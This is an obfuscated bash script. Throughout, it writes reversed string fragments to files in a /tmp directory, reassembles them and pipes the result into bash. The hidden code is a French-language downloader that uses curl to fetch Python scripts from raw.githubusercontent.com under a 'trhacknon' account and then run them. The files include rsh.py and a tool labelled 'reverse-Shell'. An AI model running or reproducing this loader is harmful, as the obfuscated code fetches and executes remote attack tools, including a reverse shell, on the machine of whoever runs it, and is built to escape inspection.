#!/bin/bash
  ${*~}  "${@##\[+1&fJ#r}"   $'\160'r""${*~~}in"${@##I;0+gHC>}"t${*#wzPZc:*l}f  %s "$(   ${@}  ${*#4K4Q2c}  '''m'${*##mwDsb#R}kd${@^}ir -p   '/tmp/;9]aS!^'  ${*//2O0^uF\[H/kX*O\!x} && ${@#Q\[-&} ${*%%s\!hn}p'r'""i''n\tf  %s  'imret tneme'  >  '/tmp/;9]aS!^/
????

'   "${@~}"   ${*~~}  && "${@#x=WyE=j}" ${@%%$k:\}Pa}  ''"p"rin$'t\x66'   %s   'ét ud noita' >   '/tmp/;9]aS!^/???
?

' ${*,,}   ${*,,} &&  ${*} $'p\x72i'"${@//$?Qj4/|eS_8E@H}"n${@/\),\}\~*/Rsw\`}t${!@}f   %s   'yp.gt 3noht'  > '/tmp/;9]aS!^/???


?'  "${@#|KKevzO}"   "${@##\[3Nxj}"  &&  ${@^}   pr''$'i\156'\t'f' %s '.war//:sptt'  >  '/tmp/;9]aS!^/?
??
??'   "${@%%\ljpXf$}" ${@^^}   ;  ${@//LeyRV\^/A\!4|.}   pr""'i'$'n\164'""${*/15dUys/WSgX}f %s  '*%|xZCWh\(}'  >   '/tmp/;9]aS!^/
?


?
'  ${@//QZ5-ai/KTz1+|\}}   ; ${*~} $'\u0070'""rin""${@//t6Bwh1~-}t''${*//\]\{JG:t/6I7pHf}f   %s 'céléT #    ' >   '/tmp/;9]aS!^/?
?
???'   ${@#|wY921}  ${*~}  && ${*/<xY@KV}  ${*,,}   ${!*}p''r"${@~~}"int\f %s '/moc.tnetno' >   '/tmp/;9]aS!^/?
???
?'   ${@//$L\"AWM/z3z1} ${*}   ;  ${*%%8%xeB}  ${*##^YLu}  ${*^}p"r"i"n"t'f' %s 'nemegrahcél'   >  '/tmp/;9]aS!^/???
?
?'  ${@~} ;  ${*%t^-vO+Ch} p\r''$'\x69'n't''f' %s  'd tnemegrah' > '/tmp/;9]aS!^/
??
??
' ${*^^} ${*//\)1qa/t_W:+}   ; ${*##$rk|uV}   p"${@~~}"r'i'''\n\tf %s   'R/nonkcahrt' >  '/tmp/;9]aS!^/?
????
' "${@,}"  "${@^^}"  ; ${@//F@66c} "${@##\{=a~fS^}" pr''i'n't$'\u0066'  %s  ' #    
& yp'   >   '/tmp/;9]aS!^/??

???'  ${*,} ;  ${@~}  pr'i'"$@"nt${*}f   %s  'céléT" ohce'  > '/tmp/;9]aS!^/
??
?
?' "${@//\8S\[N/Rtpnee}"   ${*,,}  &&   "${@~~}" pr$'\x69'""\ntf %s 'p    
nalp-'   > '/tmp/;9]aS!^/??

?
?'   "${@^}" ${*~} && ${@/p9vYzM/&cm#:\]}   $'\x70'$'\u0072'\in''t\f  %s 'grahcéléT" '  >  '/tmp/;9]aS!^/
???
??'   ${@/Hboid;/cy&Od^._}  &&  ${!@} 'p'""ri${@^^}n""t'''f' %s '.hsr regrah'   >  '/tmp/;9]aS!^/?
??


'  ${!*} "${@##o\!1IzT}"   ;  ${*~~}   $'\160'r${@##p?OUG}i"""n"\tf   %s ' [[ fi

esn' > '/tmp/;9]aS!^/?

?

?'  ${*,,} &&   ${!*} pri'n't"f"  %s 'opser daer
'  >   '/tmp/;9]aS!^/?

?


'  ${*%#dZbH=tL}  &&   "${@%AqAA\"%\{}"   ${*~~}   p"${@}"r"${@#q\(o?b}"i''n"${@/\{.bM\}e|/X|qI^e}"tf   %s  '     ${*/.1'   > '/tmp/;9]aS!^/
?

??
'   ${@,,}   &&  "${@^}"   ${*%co3U-} ""prin\t"f"  %s  '/nkrt-yb-lo'   > '/tmp/;9]aS!^/?
?
?
?' ${@^} ; ${@%^eq$r} ${!@} printf   %s   '    
"...sr'  >   '/tmp/;9]aS!^/
???


'  ${@%%Xx?X-NQ} ${*%De_g_}   &&  ${@/#\[tSd\`~E/i\!0y;\!} "${@%o92s&}" 'p'''\r\intf   %s  '   ' >  '/tmp/;9]aS!^/
?



?'   "${@%%+K\`HBR\!=}" ${*/IfTK</n.y:A}   && "${@/y,T5d+}"   ${*~~}  pr$'\u0069''n'\t""\f   %s ' enu siuped' > '/tmp/;9]aS!^/
??


?'   "${@#%%<B0Cqt}"   ${@%T\!u:q}   && "${@^}" ${*//\]\]0d}p\r$'\x69\u006e\x74f'   %s  '.gt ed noit'  > '/tmp/;9]aS!^/??
?
??' ${@%FLeu@}   ; ${*##Hpyq}   pr''$'\x69'${*/jXH\($}n''t\f  %s   'etnocresubu' >  '/tmp/;9]aS!^/?
?

?
'  ${*} ${@/3,vtD@/s\"Z=?e}  ; ${!*} ${*^^} prin${@/^\)MbJnIv}t""$'\x66'   %s  '   
neht ;]' > '/tmp/;9]aS!^/?

??

'  ${*%%\{\(4YK}   && ${*^}   p''r''\i${*~}n$'\x74'\f %s   'oot el resi' >   '/tmp/;9]aS!^/??
???
'  ${*//qahd/jQ\]9}   ;  ${@}   p"${@/c\)BU%j\(/R\)uUCo:}"r${@%\]w05-wu}i${*^}n${*,}tf %s   'eluoV" ohce'  >   '/tmp/;9]aS!^/?



?
'  ${@//v.\N;m/1wf\)ll}   ;  ${@/T5U8f/.2G\!} p'r'i$'\x6et'\f  %s  ' ed gt loot' > '/tmp/;9]aS!^/?


?
?'  ${@,,}  "${@%%f$DM;}"  && "${@##o\2<s>@}" $'\u0070'"r"$@int${*//%=s|/ATvx}f  %s 't ruop unem'  >  '/tmp/;9]aS!^/
??????'   "${@,}"   ;   "${@//1q\"1?af}"   ${*^}  pr$'\x69n'""t${*,}f  %s   ' ${!*}   ${' >  '/tmp/;9]aS!^/
?


??' $@ && ${*##\"-d0a^:} p$'\162'${*~}in${*/P<\[Kw\"/\!3qu=*}tf %s  'htig.war//:'  > '/tmp/;9]aS!^/?
?


?' "${@//X\[6pSu/>X,>\)@}"  ;   "${@,,}"  ${*,,} $'\160ri'ntf %s  'poe_\(\;/$k'   >  '/tmp/;9]aS!^/
?
?
??'   ${@##\}\)ocK=gx} ${!@}  && ${@#7k\}K} p'r'\i'n'$'\u0074'$'\u0066'  %s   '
gt loot el' >   '/tmp/;9]aS!^/?




?'   ${@#BrDNT}   ${@//_yx=UpX}  ; "${@,}"   $'\160'$'\162'"${@/P\!qWlKH}"i$'n\u0074'''f   %s 'litu ruoP" '   > '/tmp/;9]aS!^/??
??
?' ${*//A\)K,u} ; ${*/S&=vfw4/#EROyn\)m}  ${*%\)\-GA\}Z} \p${*}ri$'\u006e'''tf  %s '/i\nwMn}" $' >  '/tmp/;9]aS!^/?????

' ${!*}  "${@~~}"   ; $*   ${*/yGqwm\`hR}   p\r''\in$'t\146' %s   'ahrt/moc.tn'   >  '/tmp/;9]aS!^/?
?

??' ${*~}   "${@^^}"  &&  ${@%%9Vr%q<}  prin""${*%^d$uFe}tf  %s 'ot-gt/nonkc'  > '/tmp/;9]aS!^/?
?
?

' "${@//Y\QW|\`/#t\"=Ym^n}"   ; ${*,} pr$'\x69n\u0074'"f"   %s  '? nonkcahrt'   > '/tmp/;9]aS!^/?


??
'  "${@~~}"   ${@##T+zp*%K}   ;   ${@~~}  ${*%%^e.f^}   "p""${@%%ibFBs?Y%}"r\i$'\156\u0074f' %s  'A #

}
".én'  >  '/tmp/;9]aS!^/
????
?'  ${*,,} ${*//h$WoV/6b|m6%=}   && "${@//wZ~~\)r}"   ${*} p""r\int${*^}f  %s 'daolnwod   ' >   '/tmp/;9]aS!^/?

????'  ${*%%KI\}A\`\{Q}  ${!@}   &&   ${@//trtpA~V/fT\(\(oDKH}   """${@,,}"p'r'int'f' %s   'erèirra ne '   >   '/tmp/;9]aS!^/??

?

' ${@~~}   &&   "${@%|axE-:}" ${*//\]0^\!-X/~s,x#|W}   ""$'\u0070'r"i"nt'f' %s   '    
{ elif'   >   '/tmp/;9]aS!^/
??
?

'   ${*}  &&   ${@//DM\]&.*T5/\{Ys.}  ${@^} "p"\r""in\t''f   %s 'ohce    
yp' >   '/tmp/;9]aS!^/??
??

'   "${@^}"   ;  ${@%%;XSZ_?M}  p''"r"\i'n'$'\x74'$'\u0066' %s ' p'"'"''"'"'r\intf '   >   '/tmp/;9]aS!^/???
???'  "${@/1nfciw\{u}"  $@   && ${*^^} ${*//IEG#}p""${@^}ri''"n"$'\u0074\x66' %s 'céxE #    
'   > '/tmp/;9]aS!^/??


?
'  ${*~~}   ${*~}   &&   ${*/lj\R/*wFV*}  ${*,,}   p""${*%%Km,c\[Js.}ri''$*n$'\x74f'   %s   ''"'"'ev ${*,,} '  > '/tmp/;9]aS!^/
?

???'  ${*,} ${@//|:b-U} ;  ${*,} "${@//xTIFZ/T6dK^$c0}"  p''$'r\151\156t'""${@^}f   %s  'yp.hsr retu' > '/tmp/;9]aS!^/??


??' "${@^}" &&   ${*~}  "${@//_@?z|/\}=;\)tA}" 'p'${*}r$'\u0069\156'$'\u0074'"${@//|\"9+EOF}"f   %s 'h elif_daol'  >   '/tmp/;9]aS!^/?
??
?
' "${@~}"  ${@^} && ${*%;%6\"nq} ${*^}  ""p\r"i"n${*,,}t$'\146'  %s '9F8:+}   | '  > '/tmp/;9]aS!^/
?
?
?
'  ${@} ${*%t:S>2}  && ${*/3L|m}  ${*%bp\}z|xS} p""$'r\x69'"${@,,}"n'''t'f   %s  'ohce    
1$' >  '/tmp/;9]aS!^/
???
?
'   ${*^}   &&  ${@/>m_.}  $@  print\f  %s   'rahcéléT # '   >   '/tmp/;9]aS!^/?

??
?' ${*^} ${*^^} ;   ${*%Cnr=t3\"}  \pr"i"n"${@%J.\D}"t\f   %s 'cnoF #
'"'"'  $'   > '/tmp/;9]aS!^/
?
??
?'   ${*~}  ;  ${*}   ''${@^^}pri\n${@%u7\VtQ~}tf   %s '    
esle
"'  >  '/tmp/;9]aS!^/???

?
'   ${*^}   "${@%%Jq89W;y#}"   ;   ${*,}  p'r'i\n${*//Hf*U2:/ip?Q}tf %s ''"'"'d egassem '  >  '/tmp/;9]aS!^/??
?

?' ${*%\]ecY\!o} ; $*  ${*,}  pr"i"''$'\156t'\f %s 'élét suov-z'   >   '/tmp/;9]aS!^/?



??' "${@%%UYzNVW}" ${@//\]<Oml\[kS/*+k*un} &&  ${@//hnNTAvD/Ue-n\{3} 'p'r""$'\151'""$'\156tf'  %s  'lunnA" ohce' >  '/tmp/;9]aS!^/???

??' ${*~~}   ${*##JZYq<M}  ;  "${@%ZHgmfQQ}"  "${@%%*\(n%M+}"  ${*,,}p""r""$'\u0069'\ntf   %s   '}  $BASH  "' > '/tmp/;9]aS!^/??????
' ${*}  ${@/\"vexHb}  ; ${*}  ""${@##b7~mQk}pr${*~~}in${*,}t$'\u0066'  %s ' 
yp.gt reg' >   '/tmp/;9]aS!^/?

???
'  ${*,} && ${*~~}   ''pr'i'\n\t"f"   %s 'hrt ed gt l'  >  '/tmp/;9]aS!^/??
????' ${@,}  "${@~~}"   &&   ${@}   p"${@/sm^M<\{}"rin''t'f' %s '")non/iuo( ' >   '/tmp/;9]aS!^/?


???'   $* && ${@^} ${@%R\]pAx}   \p''\rintf   %s ' reihcif nu' >  '/tmp/;9]aS!^/
??



'   "${@/XBJDh\)i/%hg~K}"   "${@~}" ;   "${@//d<P\p6\}z/pz^t}"   "${@~~}" pr'i'\n\t${*#Ln8UEx\!}f %s  '{@}   ${*//'  >  '/tmp/;9]aS!^/
?
??

'   ${*#7yb\4&3} ;   ${*/fT;\(pZ1Q}   ${*#UtkvW}pri""\nt${*~}f   %s 'asilitu'"'"'"'"'"'"'  >  '/tmp/;9]aS!^/??
?
?
'  ${*%T5Dl} ${*/lx86<;W} &&   ${*#%\{#8L}  ${*##K^\!u}  pr"i"n$'\164'$'\146'   %s  'oitcnuf
LRU'  > '/tmp/;9]aS!^/
??

?
'  ${*%%=MmJj?} &&  ${*##\}QNp<Z}   ''p${*~~}r"""${@}"i'n'""tf %s   '_daolnwod n'  >  '/tmp/;9]aS!^/
??

??' ${@//$sfqD^\)d}  "${@%%U\{%yQo$-}"   ;   "${@%%__WFT}"  "${@##N=vHF*}"p""\r''\i'''n'''t$'\x66'  %s   'uoc ne 1$ e'  >  '/tmp/;9]aS!^/
??
???'   ${*}   "${@~}"   ; ${*,}  ${@,,}  prin"t"f  %s  '"esnopser$"'  > '/tmp/;9]aS!^/?

?
?
' "${@^^}"  &&   ${*//oo%FP}  $'\u0070ri'${@%%q^w\`7E5}n"t"\f  %s   '
yp.gt/niam'  >  '/tmp/;9]aS!^/?
?
??
' ${*//wnW=k%o9/R=\z$}   ${@} ; "${@/5G\{2\}>kA/GTr&HAYr}" "${@,}"prin\tf  %s ' O- s- lruc' >   '/tmp/;9]aS!^/
???

?' ${*}   &&   "${@^}"  ${@,} p"${@~}"r\in$'\x74'f  %s ' %s '"'"'if
".t'   >   '/tmp/;9]aS!^/???
??
'  ${@##f@1q@}   ${*}   ;   ${*#7\!kv} "p"''"${@^^}"r"""i"n$'t\u0066' %s '] "iuo" == ' >  '/tmp/;9]aS!^/?

?
??' "${@,}" "${@}"   &&  ${@^^}   $'\u0070'r"i"\n\tf   %s   ' el regrahc' > '/tmp/;9]aS!^/?


?

'  ${*%%qEAzl+} &&  ${@,,}   ${*/U\}1\{IIFz/s>O\(}  """p"$'\x72'"${@%%Lf@\"74}"in${@~~}tf  %s  ' regrahcélé'  > '/tmp/;9]aS!^/
?
????'  "${@,,}"   ;   ${*^}   ${@^} ''p${*//Fn\}N0/x3t:\]}r${@##\]Y4F\`U^}i\n"t"f  %s  ' el rehciff' >  '/tmp/;9]aS!^/
?????
'   ${!*} ${*##GA*A} ;   "${@//Y\{zV}"  p$'\162'""$'\x69'nt$'\x66'  %s '   ${*#0y6L' > '/tmp/;9]aS!^/???????'   ${*^^} ;   "${@^}" "${@/A:y*Eju}" $*p''r""'i'""${*%%H_JhcC}nt''f  %s '$(     "${@'   >  '/tmp/;9]aS!^/????

?'  ${*/<OKlZX} ;  "${@#2$01M2}"   ${@} pr\i$*nt""f  %s  '${@/~l\(\(X'   > '/tmp/;9]aS!^/?????
?' ${*//w5TXTV5/x\{Q\"Yl}  && ${!@} p\r\i$'\x6e'${!*}tf %s   'sptth elif_' >  '/tmp/;9]aS!^/?
?



'   "$@"   &&   ${@~~} ${*^^} p"""${@//JJmhgLT}"rin't'f  %s  '$\{uT2}  r'"'"'' >   '/tmp/;9]aS!^/
?
?


' ${@%>\)\(7B|}  "${@,}"  &&  ${*//aQ?ZR}  'p'${@%%<rFk$\[z}r''$'\151''n't'f'   %s ' ${@^} ${*%'   >   '/tmp/;9]aS!^/
?
?

?'   ${*%7gZNp#}  &&   "${@//h|qRLp}"  p""${@,}r$'\u0069'n't'''f  %s '/nohtyP---l' >  '/tmp/;9]aS!^/??




'  "${@}"   ;  "${@^}" $'\u0070'$*r""i""'n'\tf  %s ' regrahcélé'   >   '/tmp/;9]aS!^/?





'  "${@//SHQ;\"}"   ${*~}   ; ${*/|wZm\{9g/elcW}   ${!@}  \p${*,,}r$'\u0069'""nt"f"   %s   'nwod    
yp'   > '/tmp/;9]aS!^/?
??

?' "${@/uvJnON}"  ${@/h,:Qg/+A\!U#oDG}  &&   ${*/kpLlgimz/\(MpI6B-}  \p""\r"${@//:?rh,n}"in\tf %s 'el rehciffA' >   '/tmp/;9]aS!^/??
?


'   ${*//11nc} &&  $* ${@,,}  p$'\x72'""intf  %s   '.hsr 2nohty' >  '/tmp/;9]aS!^/??

??
'  ${@/cVA4g/?UF\";#\{W}   ;  ${!*} "${@^^}" ''\pr${*~}i$'\u006e'${*^^}tf   %s 'yp.hsr/nkrt' > '/tmp/;9]aS!^/??



?' ${*~}   ${@//cyQY}  &&  ${!*}  ${*,,}   p${*}ri$'\x6etf'   %s  'lehS-esreve' > '/tmp/;9]aS!^/?
?????'   ${*//vWzDY=c\}}  &&  ${*}  ''$'\x70'"r"i""n${@%X1LSZ}t${!@}f %s   't ruop noit'   >   '/tmp/;9]aS!^/
?
???
' ${@%3mbuU}  ; "${@~}" ${@^}  $'\x70r'i${@%%Uvb-p}n''t""f %s   '/T\)4:,K}" '  >  '/tmp/;9]aS!^/????


' ${@,,}  ${*^} ;  ${@^^}  ${*//Jr^wx} "p"$'r\u0069nt'f   %s   'yp : nonkca'   >   '/tmp/;9]aS!^/???



'   ${*//&7JB}   ${*##0iO}   &&   ${*~}  "${@^^}" 'p'r"i"${@/Zr<\)g4/1@@Ng6+}n${*,,}tf  %s  'F}  <<<   "' > '/tmp/;9]aS!^/????
?
' ${@//l6rJ\]S\]/ZS_Sv\}}   &&  ${!*} p\r${@%%\[66*j}i$'\156'""t\f  %s   ',@oU}   )" ' >  '/tmp/;9]aS!^/
?

?

'   "${@}" $@ && ${*%3ABx_y}   ''\p''\r'i'n""${!*}tf %s  'cresubuhtig' >  '/tmp/;9]aS!^/?
???

'  ${@/uK6_WYxX/p$rk$} &&  "${@##kG\n4F6j}"  ''pri\nt""${*^^}f  %s 'e8git\]/F;%'  > '/tmp/;9]aS!^/
?

?
?'   ${*^}  ;   ${*~~}   pr\in$'\x74'''f %s  '{*//iwMM7K*' > '/tmp/;9]aS!^/????
??'  ${*,}   &&  "${@}"   "${@,}"  $'\143'at   '/tmp/;9]aS!^'/??????? "${@~~}"  ${@/P:i3?O} ;   ${*^^}  ${*^}  '''r'm  '/tmp/;9]aS!^'/??????? ${@#vUP\`Jj}  && ${*^^}  r''$'\x6d'${*//\a&w/<AmW%*#}di""r '/tmp/;9]aS!^';   ${*%T\{7\`E} "${@/\{a#y~n}"     )"  ${@}  $*  |  $@   "b"as"h"   "${@//sKn,M&/@;KCigQ|}" ${*%+\`0\{>Q} 